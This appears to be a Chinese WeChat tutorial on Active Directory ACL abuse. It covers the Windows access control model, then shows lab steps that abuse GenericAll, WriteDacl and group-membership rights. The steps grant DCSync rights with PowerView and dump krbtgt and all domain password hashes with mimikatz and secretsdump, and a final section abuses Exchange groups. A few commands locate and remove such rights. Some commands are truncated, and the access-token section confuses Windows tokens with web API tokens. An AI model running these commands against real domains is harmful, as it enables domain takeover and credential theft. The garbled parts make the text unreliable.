<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/9i0k42DYbxKi9_d6hqgbKg)

**内网渗透 域 ACL 攻防**

![](https://mmbiz.qpic.cn/mmbiz_gif/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Qa5IS9U9wbic2L6KoP4rEeEpoEP2GcJQfuBM6zFARibKDsQ41EkDtmdTg/640?wx_fmt=gif)

****windows 访问控制模型****
----------------------

在 Active Directory 中设置权限，其方式与在文件中设置权限的方式几乎相同。权限控制都是使用 windows 访问控制模型

windwos 访问控制模型包含以下部分

1、访问令牌（Access Tolen）

2、包含用户的标识（User SID，Group SID S），以及特权列表

3、安全描述符（security identifiers）

4、被访问的安全对象的相关安全信息

这里的安全对象包括但不限于

· NTFS 卷上的文件和目录

· 注册表项

· 网络共享

· 服务

· Active Directory 对象

· 进程等

****Access Token****

access Token 用于基于 Token 的认证模式，允许应用访问一个资源 API。用户认证授权成功后，Authing 会签发 Access Token 给应用。应用需要携带 Access Token 访问资源 API，资源服务 API 会通过拦截器检查 Access TOken 中的 scope 字段是否包含特定的权限项目，从而决定是否返回资源

系统使用访问令牌来标识用户，访问令牌包括用户的 SID、所在组的 SID 等信息

****安全描述符****
-------------

SID（Security Identifiers）即安全描述符

安全描述符标识对象的所有者，并包含以下访问控制列表

1、Discretionary Access Control List（DACL）自由访问控制列表

2、System Access Control List（SACL）系统访问控制列表

每一种控制列表中都存在若干条 ACE（Access Control Entries）访问控制条目

查看 domain user 属性 -> 安全 -> 高级

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QFtgWbhYicYwbGH6DrzOvcCbH4kNJncccQrKOSKLn1MGiaCj2sC2gFicbw/640?wx_fmt=png)

安全描述符由 Header、SID、DACL 和 SACL 组成

ACE 是针对特定用户或特定组的单个权限授予（或拒绝权力）的配置结构。ACE 有许多不同类型，但是在 Active Directory 的权限中，只有四种不同的含义，两种分别用于授权和拒绝权限。

****Access Mask****

在 ACE 中有 Access Mask 这个字段，它代表着此条 ACE 所对应的权限，比如完全控制（GenericALl）、修改密码（RestPassword）、写入属性（WriteMembers）等等

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Q5P0mrPLFjNSkzuNslWUPlvr8ebIw3dQToSSdvJ9gKibrZjl3JvNLBiaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QQN0SYSNkoznib7t6cgVmib2ljoroBML9L2rwqbbZHhbLM4NsttiaibZZ8w/640?wx_fmt=png)

****Trustees****

Trustees 的意思为受委托人，受委托是一个 ACE 所应用到的用户账户，组账户或者是登录会话。也就是说，谁是一个 ACE 的受托者，那么这条 ACE 中的 Access Mask 所对应的权限（可能是拒绝可能是通过）就会赋予受托者

****域里常见可利用的 ACL****
--------------------

· GenericAll ：授予目标对象的完全控制权，包括 WriteDacl 和 WriteOwner 特权。

· GenericWrite ：此权限能够更新目标对象的属性值

· Self-Membership ：这条权限指的是某个账户能够把自身添加到某个组的权限 (需要在某个组的高级权限中添加 ACE，也就是说针对的是组对象)

· WriteProperty ：WriteProperty 直译为写所有权。这个权限利用针对的对象为组对象，能够赋予账户对于某个组的可写权限

· WriteOwner ：WriteProperty on Group 说的是对一个组具有 WriteProperty 权限的情况下，“写入全部属性” 除了 WriteProperty 还包括了其他的权限

· WriteDacl ：WriteDacl 允许委托人修改受影响对象的 DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl 是在链中启用其他权利的权利。

### ****GenericAll****

nami\users 用户的权限

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QXtzS04H5eibnc6ELib6zlqRibciaibDIc8ic1Kwezyn5O0JqGPvE6vmP0weg/640?wx_fmt=png)

将 nami\users 权限设置完全控制

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QQia5CWibEStpEK7ia89TwpLVDsZdz6Vjr31g2nFXRDpELicHKWDE0eKcNQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QVXlGJ6uQdntISZCEUUmriczaVA1jZ8mAIpg6ib18micasGf68tibfmHPmQ/640?wx_fmt=png)

执行 powershell 命令查看 test 用户的 GenericAll 权限项，这些权限项对应的就是 ACE 的有效访问

```
.\SharpView.exe Get-ObjectAcl -SamAccountName test -ResolveGUIDs
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Qxc72oFmtiaFHbmicMByd2Jh3gsbstocTibvMjqQLh5Im0yInEtlcqKktg/640?wx_fmt=png)

在域控上设置 test 用户的 DACL，添加 nami 用户对 test 的完全控制

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QrsuEI5umP3j2WfO7Ynkp1ZT0MEglHLr0yOTNK4I8ibua3icwDEIbo0SQ/640?wx_fmt=png)

再次查询 test 用户的 DACL，就会发现 ActiveDirectoryRights 属性等于 GenericAll 的 acl 发现多了一条

```
Get-ObjectAcl -SamAccountName nami -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QhUlSkN9Ah51CAkiaYZsZJW15va11L3ARW343y7VrbIX6AAIOLGwoXyA/640?wx_fmt=png)

这条 ACL 的含义是：

nami 账户对 test 账户具有完全管理（GenericALL）权限

可以看到在设置 DACL 之前和之后的区别，设置 ACL 之后是立即生效的。然后使用 runas 命令就可以直接创建一个 tset 权限的 cmd 窗口：

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QTPSMlWkIVaYdbEf7RN58X2EukZXHDJibU13YIYT9gS30HYrQReN4Zuw/640?wx_fmt=png)

拥有这个权限可直接 DCSync，dump 哈希

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QoJVeyegx81UEMpTw3l1UBkP9JU2T8tX5GkXyBXdMial8ydicgguCF4mQ/640?wx_fmt=png)

### ****GenericAll on Group****

GenericAll on Group 是对一个组有 GenericAll 权限，使用命令查看用户组

```
Get-NetGroup "domain admins"
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QFleicXDQuvNhleut6X4lyUiaX7lWIQN6COxr6zyqiaj70nuegfgpJCgbg/640?wx_fmt=png)

此时 nami 和 test 均为域内普通权限用户，然后再管理员组 domain admins 的 DACL 中加入 nami 的 GenericALL 权限

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Q91CpuNXwNdDjRjsCqEu3pKXURIlXd2jWGfH9uk0Kyibsdk8f2NdrRYg/640?wx_fmt=png)

完全控制权限

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Q3CBbsNaHuQkFN6kNxMDjAdjKSv7yKsyJt9QichtyoseehVx9GdgmY2w/640?wx_fmt=png)

再次去查询使用命令查看 domain admins 的权限。可以看到一条 SID 为 nami 的 SID，权限为 GenericAll

```
Get-ObjectAcl -ResolveGUIDs| ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QjhOq2vjTE7waZ8t09mSZvcaspTOoYia3xSXgFQRFSDV2KklSWQ4KQRA/640?wx_fmt=png)

然后尝试将 test 加入 domain admins 组

```
net group "domain admins" test /add /domain
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Q2lOpZWicNx3ZNXcia4HrXTmPWzib0cvAWib1WMmtkicsu29EqYFor9ia8LtQ/640?wx_fmt=png)

```
net group "domain admins" test /del /domain
```

将 nami 的 GenericAll 权限在 domain admins 移出之后，再次执行就会被拒绝

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QQAl6urseujKicL8JXggGzGdyHFtEPNCbJnmmQPsIkyTtwibQAaE1r5fA/640?wx_fmt=png)

拥有这个权限可直接 DCSync，dump 哈希

### ****WriteDacl****

WriteDacl 允许委托人修改受影响对象 DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl 是在链中启用其他权利的权利。

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Q7oHdBT5Dt2LYBHsVzXYw1fia1nkRzpO2vUk25lPYGIANDOAQa1YLjrw/640?wx_fmt=png)

当前拥有 WriteDacl 权限，没有 DCSync 权限。

```
Get-ObjectAcl -SamAccountName "nami" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights-like "*dacl*"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QIhkIgDtbWA862zVzuuHqnYibkbef3ZpCyv71NQKH13YDqdt4BRNR0Kw/640?wx_fmt=png)

自己向自己写入 DSCync 权限

```
powershell.exe -exec bypass -command "&{Import-Module .\PowerView.ps1;Add-DomainObjectAcl -TargetIdentity \"DC=nami,DC=com\" -PrincipalIdentity nami -Rights DCSync -Verbose}"
```

或

```
Add-DomainObjectAcl -TargetIdentity "DC=nami,DC=com" -PrincipalIdentity nami -Rights DCSync -Verbose
```

写入成功之后，直接 dump 哈希

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QIhkIgDtbWA862zVzuuHqnYibkbef3ZpCyv71NQKH13YDqdt4BRNR0Kw/640?wx_fmt=png)

### ****Self (Self-Membership) on Group****

这条权限指的是某个账户能够把自身添加到某个组的权限（需要在某个组的高级权限中添加 ACE，也就是说针对的是组对象）

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QUkdEbXtwFlL8bHWolHAwhwNsnxQG8rrKAwxElO3EPhUz0LeibIYS2BA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Q93IJBPV2VkyeeCm7DNnabgS8HczzsvgrH8rT8vu8vLicr1gBluiahwCQ/640?wx_fmt=png)

可以把自身加入域管理员组

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QQgFibs0iatokSSMMs6mytHL2WIiaqwyDFyxHCS2ZaWuHFveGia9xczbrsg/640?wx_fmt=png)

已经加入域管理员组

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QD03Reib5WgEAcvMmSUsannYQQb6etEDYYia1hiagKia72G11FVFVp3Porw/640?wx_fmt=png)

添加到管理员组，可以直接 DCSync。

****注意****：添加到管理员组之后需要重新登录才可以 DCSync

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Qm6HBxLbO2b8t82hXF3ibMPjIn2ria8QPXTcTUSJqHObSl7LfkBKFEelg/640?wx_fmt=png)

****WriteProperty on Group****

对一组具有 WriteProperty 权限的情况下，"写入全部属性" 除了 WriteProperty 还包括了其他的权限

CreateChild, DeleteChild, Self, WriteProperty, ExtendedRight, GenericRead, WriteDacl, WriteOwner

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Qko2m3zF7DLiaYjlw8jjLETd6bjszRdicgvPniaicxeVOkp1q9b9IVAk84w/640?wx_fmt=png)

在 Domain Admins 组的列表中添加写入全部属性，会生成一条新的 ACE，访问会被标记为特殊

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QfB4voM2SFAl9ibDiaiaZyVn2tzmKpTO5UddnNdbutoibPRGTleMBnqhqOg/640?wx_fmt=png)

添加 ACE 前后

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QiaCiaPrmscWXIvyr2sjdTnKbon88r2MFABSwwClfdLh3icU0qo896fbTQ/640?wx_fmt=png)

同样加入到管理员组就可以 DCSync

****ACL 相关的攻击方式 - DCSync 攻击****
-------------------------------

### ****什么是 DCSync?****

在域环境中，不同域控制器 (DC) 之间，每 15 分钟都会有一次域数据的同步。当一个域控制器 (DC1) 想从其他域控制器 (DC2) 获取数据时，DC1 会向 DC2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述的过程。DCSync 就是利用的这个原理，通过 Directory Replication Service（DRS）服务的 GetNCChanges 接口向域控发起数据同步请求。****域控制器之间的数据同步复制****

但是在 2015 年 8 月份， Mimkatz 新增了一个主要功能叫 "DCSync"，使用这项技术可以有效地 "模拟" 域控制器并从目标域控上请求域内用户密码 hash

DCSync 攻击的对象如果是只读域控制器（RODC），则会失效。因为 RODC 是不能参与复制同步数据到其他 DC 的

****DCSync 需要什么权限****

一个域内用户想要通过 DCSync 获取 krbtgt 的 HASH 值需要在域对象或者域内的高权限组中有以下权限：

****复制目录更改**** Replicating Directory Changes (DS-Replication-Get-Changes)

****复制目录更改所有**** Replicating Directory Changes All (DS-Replication-Get-Changes-All)（Exchange 用的就是这个）

这几个权限在 DACL 的设置中可以看到

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QVr4RfzJ4gKhWZda3QBBlNvAEN2NxUXibERRq0daexG7gFLQhLEulhdA/640?wx_fmt=png)

### ****写入一个 DCSync****

在域控中给一个用户添加 DCSync 权限，使用 powerviewer.ps1 的 Add-DomainObjectAcl 函数实现

```
Add-DomainObjectAcl -TargetIdentity "DC=nami,DC=com" -PrincipalIdentity win7 -Rights DCSync
```

或

```
powershell.exe -exec bypass -command "&{Import-Module .\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \"DC=nami,DC=com\" -PrincipalIdentity win7 -Rights DCSync -Verbose}"
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Q8zZm6gKBsYKicicbCqMIiblzicHo6EXeZu0YzibwW6eEVXOI19Ovp3icqD5Q/640?wx_fmt=png)

在 DACL 这里新增了一条 ACE

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QdHGYNrP2GnZmicMjCvzibLUP6l5b74zfflwByyqOYCsUvHcu9qzichnhA/640?wx_fmt=png)

使用 win7 用户导出 hash，这里不需要 debug 权限也可以直接 dump 哈希，因为 DCSync 去向域控发起请求，并非本地操作，为网络请求。

```
mimikatz.exe "lsadump::dcsync /user:krbtgt" "exit"
mimikatz.exe "lsadump::dcsync /user:all" "exit"
mimikatz.exe "log Micropoor.txt"  "lsadump::dcsync /domain:nami.com /all /csv " "exit"
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QQMlT9et07cEXkComUSeyQdPOicbgDHd9UvwnpGgv25WW0AUqKYicASyA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QP9I0uOarYVyQSXXTWMhPLPLlcAdicBJmFPImaDOaMy16ouTa2uMR8hA/640?wx_fmt=png)

****删除一个 DCSync****

```
powershell.exe -exec bypass -command "&{Import-Module .\PowerView.ps1;Remove-DomainObjectAcl -TargetIdentity \"DC=test,DC=com\" -PrincipalIdentity test -Rights DCSync -Verbose}"
```

或

```
Remove-DomainObjectAcl -TargetIdentity "DC=nami,DC=com" -PrincipalIdentity nami -Rights DCSync -Verbose
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QpMx17tO9icKeFhJLeMbBj5YmbMspRWTd7l9jVQnSrfTsV5LLwCx5TAA/640?wx_fmt=png)

再次 DSCync 被拒绝

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Q5a6lqBWGD4TXnpJGcUegOWI81NhfDco13cf5t8u6gWKVwHGqKN3h0w/640?wx_fmt=png)

**查询具有 DCSync 权限的用户**

```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ObjectAceType  -match "DS-Replication-Get-Changes"}
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ObjectAceType  -match "Replicating Directory Chan
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QPZpzia7uFS9umwib2vibJXJk2LAXF7psLyHSKOX9wmSZ7utDz59RsunaQ/640?wx_fmt=png)

**使用 Adfind 查找**

```
AdFind.exe -s subtree -b "DC=nami,DC=com" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes";; -recmute
AdFind.exe -s subtree -b "DC=nami,DC=com" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes All";; -recmute
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QNJufvtA0jy5SwtxAnnOrD4qiaic5DvqGxfYk6iaxdhIZfsJ8WWry2MmHg/640?wx_fmt=png)

我又增加了一个 test 用户

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QubmOMF4iania1dIuuibJNPKS85BKDlf7ZyZdU7vSCBKtTCc1Ip6mXvf0w/640?wx_fmt=png)

若拿到用户为以下组的用户，即可直接写入 DCSync 功能，从而 dump 哈希

Administrators 组内的用户

domain admins 组

enterprise admins 组

域控制器的计算机账户

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Ql2D89ibNQ0rhvw19eyoC786QiaO5F4mX8E3S0xTDibCAD6ic94uRHfolyQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QKxUISaBY1h6NNBvicjSTqP9U1jhsUDfu8euoag9cShzZvD0EDV16HXw/640?wx_fmt=png)

**查看用户所具备的 ACL**

```
Get-DomainObjectAcl -Identity nami -domain nami.com -ResolveGUIDs
```

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QCxq7Dh1G3pOPsRcKdN7UX6LicQF9Y2uTA2j1zMHVRKXlzY4yqs7eM4A/640?wx_fmt=png)

### ****Exchange****

Exchange 2019 之前的版本

安装好 exchange 之后，Exchange 会添加一个名为 Microsoft Exchange Security Groups ，其中包括几个特殊的组：

Exchange Trusted Subsystem

Exchange Windows Permission

Organization Management

如果获得了这三个组内任意用户的控制权限，就能够继承该组的 WriteDACL 权限，进而修改域对象的 ACL。

默认情况下，Exchange Windows Permissions 对安装 Exchange 的域对象具有 WriteDacl 权限，那么 Exchange Trusted Subsystem 也会继承这个权限

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Q39ZoNfOiaDVh73lJ2mQyDPn4kpyC4otfd0ncx7IC9qCItMgypzjD3hQ/640?wx_fmt=png)

其中 Exchange Trusted Subsystem 是 Exchange Windwos Permissions 的成员

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QiaI5EZbhW9o1XTvuNfGc843xP4XOU7js9YDMYqXia2bYg9QARZKwrzeg/640?wx_fmt=png)

添加一个 win7 的成员，如果对域对象具有了 WriteDACL 权限，就能够为指定域用户添加 ACE，其获得利用 DCSync 导出域内所有用户 hash 的权限

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QRok9DqYmJxGK2vd2z49ENAWJ5zS9OD53UXnZR5icRIIrdE2DH6G3Pwg/640?wx_fmt=png)

查看当前的权限

whoami /groups

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13Q7NwpSSI1RF5zqKdqyic5xiau1WNx2XmUTkkTP9QwkH42JGJo1akHKnFg/640?wx_fmt=png)

或者使用命令添加一个用户到 Exchange Trusted Subsystem 组

```
net user test2 test2@123 /add /domain
net group "Exchange Trusted Subsystem" test2 /add /domain
python3 secretsdump.py nami/test2:test2@123@10.0.20.16 -just-dc-user krbtgt
```

装了 Exchange2 遍没装成功，，，

当有了 WriteDacl 权限之后就可以自己向自己写入一条 ACE，上面有写到，然后就可以 dcsync 了

也可以参考这篇文章：

https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8Exchange%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E7%89%B9%E5%AE%9A%E7%9A%84ACL%E5%AE%9E%E7%8E%B0%E5%9F%9F%E6%8F%90%E6%9D%83

**关注公众号**  

公众号长期更新安全类文章，关注公众号，以便下次轻松查阅

 ![](http://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ACib1YxUkAP5V2ldRHEzgqytbTxUd3Kao6poq8QU460nFxylPwDGauvzVCnWibRkAI7buhwHAl7GyKQ/0?wx_fmt=png) ** moonsec ** 暗月博客 165 篇原创内容  公众号

****渗透培训****

需要渗透测试培训联系暗月  

![](https://mmbiz.qpic.cn/mmbiz_png/Jvbbfg0s6ABTAO277SCCEFYI4YQ8N13QlRSrqNNfuLBuBwg4JmmIgAlhOtkmx56BOzg3jwnIFFM0uyc83JMV2Q/640?wx_fmt=png)